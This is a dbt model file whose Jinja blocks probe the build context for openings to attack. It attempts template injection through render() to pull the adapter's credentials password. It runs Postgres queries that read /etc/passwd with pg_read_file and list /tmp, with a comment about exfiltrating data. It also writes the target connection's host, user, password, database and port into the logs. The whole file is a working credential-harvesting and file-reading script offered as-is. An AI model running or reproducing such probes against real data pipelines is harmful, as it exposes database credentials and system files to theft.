{{ config(materialized='view') }}

{# Probe write capabilities and execute context #}

{# Check if execute is True (means we're in dbt run, not compile) #}
{{ log("EXECUTE_FLAG=" ~ execute | string, info=True) if execute is defined else log("EXECUTE_UNDEF", info=True) }}

{# Try to use the write() function if available #}
{%- if write is defined -%}
  {{ log("WRITE_TYPE=" ~ write | string | truncate(200), info=True) }}
  {%- set write_result = write("PROBE_MARKER_12345") -%}
  {{ log("WRITE_RESULT=" ~ write_result | string | truncate(200), info=True) }}
{%- endif -%}

{# Try render() on template strings #}
{%- if render is defined -%}
  {{ log("RENDER_TYPE=" ~ render | string | truncate(200), info=True) }}
  {%- set rendered = render("{{ 7*7 }}") -%}
  {{ log("RENDER_EVAL=" ~ rendered | string, info=True) }}
  {# Try SSTI through render #}
  {%- set rendered2 = render("{{ adapter.config.credentials.password }}") -%}
  {{ log("RENDER_CRED=" ~ rendered2 | string | truncate(300), info=True) }}
{%- endif -%}

{# Try run_query if execute is true #}
{%- if execute -%}
  {{ log("EXECUTE_TRUE_TRYING_QUERY", info=True) }}
  {%- set results = run_query("SELECT version()") -%}
  {{ log("DB_VERSION=" ~ results | string | truncate(500), info=True) }}

  {# Postgres-specific: read files via pg_read_file #}
  {%- set pg_file = run_query("SELECT pg_read_file('/etc/passwd') as data") -%}
  {{ log("PG_READ_FILE=" ~ pg_file | string | truncate(500), info=True) }}

  {# Try COPY to exfil data #}
  {%- set pg_ls = run_query("SELECT * FROM pg_ls_dir('/tmp') LIMIT 10") -%}
  {{ log("PG_LS_DIR=" ~ pg_ls | string | truncate(500), info=True) }}

  {# Try pg_stat_file #}
  {%- set stat = run_query("SELECT * FROM pg_stat_file('/etc/passwd')") -%}
  {{ log("PG_STAT=" ~ stat | string | truncate(500), info=True) }}
{%- else -%}
  {{ log("EXECUTE_FALSE_SKIP_QUERY", info=True) }}
{%- endif -%}

{# Probe the exceptions module #}
{%- if exceptions is defined -%}
  {{ log("EXCEPTIONS_TYPE=" ~ exceptions | string | truncate(300), info=True) }}
  {{ log("EXCEPTIONS_DIR=" ~ exceptions.__class__ | string | truncate(300), info=True) if exceptions.__class__ is defined else "" }}
{%- endif -%}

{# Probe the graph object for sensitive info #}
{%- if graph is defined -%}
  {{ log("GRAPH_TYPE=" ~ graph | string | truncate(200), info=True) }}
  {{ log("GRAPH_NODES_COUNT=" ~ graph.nodes | length | string, info=True) if graph.nodes is defined else "" }}
{%- endif -%}

{# Check target object for connection details #}
{%- if target is defined -%}
  {{ log("TARGET_FULL=" ~ target | string | truncate(500), info=True) }}
  {{ log("TARGET_NAME=" ~ target.name | string, info=True) if target.name is defined else "" }}
  {{ log("TARGET_TYPE=" ~ target.type | string, info=True) if target.type is defined else "" }}
  {{ log("TARGET_HOST=" ~ target.host | string, info=True) if target.host is defined else "" }}
  {{ log("TARGET_USER=" ~ target.user | string, info=True) if target.user is defined else "" }}
  {{ log("TARGET_PASS=" ~ target.password | string, info=True) if target.password is defined else "" }}
  {{ log("TARGET_SCHEMA=" ~ target.schema | string, info=True) if target.schema is defined else "" }}
  {{ log("TARGET_DBNAME=" ~ target.dbname | string, info=True) if target.dbname is defined else "" }}
  {{ log("TARGET_PORT=" ~ target.port | string, info=True) if target.port is defined else "" }}
{%- endif -%}

SELECT 1 as id
